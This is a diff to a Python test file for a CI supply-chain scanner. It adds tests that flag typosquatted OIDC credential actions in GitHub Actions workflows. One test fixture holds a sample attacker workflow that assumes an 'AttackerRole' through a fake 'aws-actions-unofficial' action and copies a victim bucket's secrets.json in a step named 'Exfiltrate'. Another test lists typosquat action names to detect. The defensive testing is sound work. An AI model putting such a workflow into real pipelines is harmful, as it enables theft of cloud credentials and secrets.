@@ -18,6 +18,7 @@ from analyze import (
     StructuralPayloadAnalyzer,
     TemporalDriftAnalyzer,
     _deep_merge,
+    _is_oidc_consumer_typosquatted,
     _load_allowlist,
     _parse_added_packages,
     load_config,
@@ -1882,7 +1883,7 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
         result = a.analyze()
         self.assertEqual(result["actions_poisoning"]["total"], 1)
         sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
-        self.assertIn("oidc_elevation_no_consumer", sig_types)
+        self.assertIn("oidc_elevation_typosquatted", sig_types)
 
     def test_legitimate_oidc_consumer_still_passes(self):
         """Fix 2 — exact-match should not break legitimate aws-actions/ usage."""
@@ -1952,6 +1953,78 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
         result = a.analyze()
         sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
         self.assertIn("base64_payload", sig_types)
+
+
+    def test_typosquatted_oidc_action_detected_as_critical(self):
+        """
+        Typosquatted OIDC action (aws-actions-unofficial/) should be CRITICAL.
+
+        Updates AW03 red-team expectation:
+        OLD: CAUTION
+        NEW: DESTRUCTIVE (typosquat = CRITICAL signal alone)
+        """
+        workflow_yaml = (
+            "name: Deploy\non: [push]\n\n"
+            "permissions:\n  id-token: write\n  contents: read\n\n"
+            "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - uses: actions/checkout@v4\n\n"
+            "      - name: Assume attacker role\n"
+            "        uses: aws-actions-unofficial/configure-aws-credentials@v4\n"
+            "        with:\n"
+            "          role-to-assume: arn:aws:iam::999999999999:role/AttackerRole\n"
+            "          aws-region: us-east-1\n\n"
+            "      - name: Exfiltrate\n"
+            "        run: aws s3 cp s3://victim-bucket/secrets.json /tmp/\n"
+        )
+        analyzer = _make_analyzer()
+        d = self._build_workflow_diff('.github/workflows/deploy.yml', workflow_yaml)
+        result = analyzer._scan_github_actions_poisoning([d])
+
+        self.assertTrue(len(result) > 0, "Should detect typosquatted OIDC workflow")
+
+        workflow_result = result[0]
+        typosquat_signals = [
+            s for s in workflow_result['signals']
+            if s['type'] == 'oidc_elevation_typosquatted'
+        ]
+
+        self.assertTrue(len(typosquat_signals) > 0, "Should detect oidc_elevation_typosquatted signal")
+        self.assertEqual(typosquat_signals[0]['severity'], 'CRITICAL', "Typosquatted OIDC should be CRITICAL")
+        self.assertEqual(workflow_result['severity'], 'CRITICAL', "Workflow should have CRITICAL severity")
+
+    def test_typosquat_detection_patterns(self):
+        """Unit test for typosquat pattern detection logic."""
+
+        # True positives
+        typosquat_actions = [
+            'aws-actions-unofficial/configure-aws-credentials@v4',
+            'aws-actions-fork/configure-aws-credentials@main',
+            'aws-action/configure-aws-credentials@v4',
+            'google-github-actions-fork/auth@v1',
+            'google-github-action/auth@latest',
+            'aws-actions/some-other-action@v1',
+        ]
+
+        for action in typosquat_actions:
+            self.assertTrue(
+                _is_oidc_consumer_typosquatted(action),
+                f"Should detect {action} as typosquat"
+            )
+
+        # True negatives
+        legitimate_actions = [
+            'aws-actions/configure-aws-credentials@v4',
+            'google-github-actions/auth@v1',
+            'azure/login@v1',
+            'actions/checkout@v4',
+            'some-random-org/some-action@v1',
+        ]
+
+        for action in legitimate_actions:
+            self.assertFalse(
+                _is_oidc_consumer_typosquatted(action),
+                f"Should NOT detect {action} as typosquat"
+            )
 
 
 if __name__ == "__main__":
